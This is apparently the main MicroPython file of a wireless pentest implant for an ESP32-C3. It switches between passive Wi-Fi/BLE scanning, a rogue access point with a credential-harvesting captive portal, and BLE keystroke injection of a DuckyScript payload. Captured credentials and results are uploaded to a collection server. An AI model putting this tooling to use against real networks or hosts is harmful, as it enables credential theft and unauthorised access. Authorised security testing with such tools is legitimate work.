"""HexBee Stinger — ESP32-C3 wireless implant.

One board, three jobs, chosen by `mode` in config.py:

    scan    passive reconnaissance — listens, never transmits at a target
    portal  rogue access point with a captive portal
    hid     BLE keyboard, injecting DuckyScript into a paired host

Only the module for the active mode is imported, which matters on a board
with roughly 100 KB of usable heap.

Everything it produces goes into the Hive's evidence chain, so an engagement
report can show what was done as well as what was found.

Authorised testing only. Two of these modes transmit at other people's
equipment; the Hive's scope enforcer exists because that needs a paper trail.
"""

import gc
import time

import link


def run_scan(cfg):
    """Passive recon. Cycles until reset."""
    import scanner

    try:
        import bluetooth
        ble = bluetooth.BLE()
        ble.active(True)
    except (ImportError, OSError):
        ble = None

    sta = link.connect_wifi()
    interval = cfg.get("scan_interval", 60)
    ble_seconds = cfg.get("ble_seconds", 8)
    print("mode: scan — passive only, nothing is transmitted at targets")

    while True:
        started = time.time()
        if not sta.isconnected():
            sta = link.connect_wifi()
        if sta.isconnected() and not link.time_synced():
            link.sync_time()

        wifi_hits = scanner.scan_wifi(sta)
        ble_hits = scanner.scan_ble(ble, ble_seconds)
        sent = link.flush(sta)
        gc.collect()
        print("wifi=%d ble=%d queued=%d sent=%d free=%d"
              % (wifi_hits, ble_hits, link.queued(), sent, gc.mem_free()))

        elapsed = time.time() - started
        if elapsed < interval:
            time.sleep(interval - elapsed)


def run_portal(cfg):
    """Rogue AP with a captive portal, harvesting typed credentials."""
    from portal import CaptivePortal

    ssid = cfg.get("portal_ssid", "Guest WiFi")
    duration = cfg.get("portal_seconds") or None
    print("mode: portal — broadcasting", repr(ssid))
    print("this transmits. Make sure it is inside your authorised scope.")

    def on_capture(record):
        link.enqueue("credential_capture", record)

    portal = CaptivePortal(
        ssid,
        title=cfg.get("portal_title", "Wi-Fi Login"),
        subtitle=cfg.get("portal_subtitle", ""),
        channel=cfg.get("portal_channel", 6),
        include_material=cfg.get("portal_include_material", False),
        on_capture=on_capture,
    )
    link.enqueue("recon_finding", {
        "finding": "rogue_ap_started", "ssid": ssid,
        "method": "captive_portal",
        "summary": "Rogue access point broadcasting " + ssid})

    captures = portal.run(duration)

    link.enqueue("recon_finding", {
        "finding": "rogue_ap_summary", "ssid": ssid,
        "credentials_captured": len(captures),
        "clients_seen": len(portal.clients_seen),
        "method": "captive_portal",
        "summary": "%d credential(s) from %d client(s)"
                   % (len(captures), len(portal.clients_seen))})

    # The AP is down now, so rejoin the uplink to report.
    sta = link.connect_wifi()
    sent = link.flush(sta)
    if link.queued():
        spooled = link.spool()
        print("Hive unreachable —", spooled, "event(s) spooled to flash")
    print("portal finished:", len(captures), "capture(s),", sent, "uploaded")


def run_hid(cfg):
    """BLE keyboard. Advertises, waits for a host, then types the payload."""
    from hid import BLEKeyboard, Ducky

    payload = cfg.get("hid_payload", "payload.txt")
    name = cfg.get("hid_name", "Wireless Keyboard")
    grace = cfg.get("hid_grace", 3)

    print("mode: hid — advertising as", repr(name))
    print("payload:", payload)
    print("this injects keystrokes. Authorised targets only.")

    keyboard = BLEKeyboard(name)
    if not keyboard.wait_for_host(cfg.get("hid_pair_timeout", 120)):
        print("nothing paired — giving up")
        link.enqueue("hid_deployment", {
            "payload_name": payload, "result": "no host paired",
            "transport": "ble", "keystrokes": 0, "lines": 0})
        _report()
        return

    # A moment for the host to finish setting the keyboard up before typing.
    time.sleep(grace)

    ducky = Ducky(keyboard)
    result, error = {"lines": 0, "keys": 0}, None
    try:
        result = ducky.run_file(payload)
    except Exception as exc:      # a bad payload must not brick the board
        error = str(exc)
        print("payload error:", error)

    print("done: %d line(s), %d keystroke(s)" % (result["lines"], result["keys"]))
    link.enqueue("hid_deployment", {
        "payload_name": payload,
        "result": error or "ok",
        "transport": "ble",
        "target_name": name,
        "lines": result["lines"],
        "keystrokes": result["keys"],
        "summary": "BLE keystroke injection via " + payload,
    })
    _report()


def _report():
    """Get whatever we recorded back to the Hive, or spool it."""
    sta = link.connect_wifi()
    sent = link.flush(sta)
    if link.queued():
        link.spool()
        print("Hive unreachable — spooled to flash for the next run")
    else:
        print("reported", sent, "event(s)")


MODES = {"scan": run_scan, "portal": run_portal, "hid": run_hid}


def main():
    cfg = link.CONFIG
    mode = cfg.get("mode", "scan")

    print()
    print("HexBee Stinger —", link.DEVICE)
    print("hive:", link.HIVE_URL or "(none configured)")

    recovered = link.unspool()
    if recovered:
        print("recovered", recovered, "spooled event(s) from a previous run")

    handler = MODES.get(mode)
    if handler is None:
        print("unknown mode", repr(mode), "— expected one of", list(MODES))
        return
    try:
        handler(cfg)
    except KeyboardInterrupt:
        print("\nstopped")
        link.flush()
        link.spool()


main()
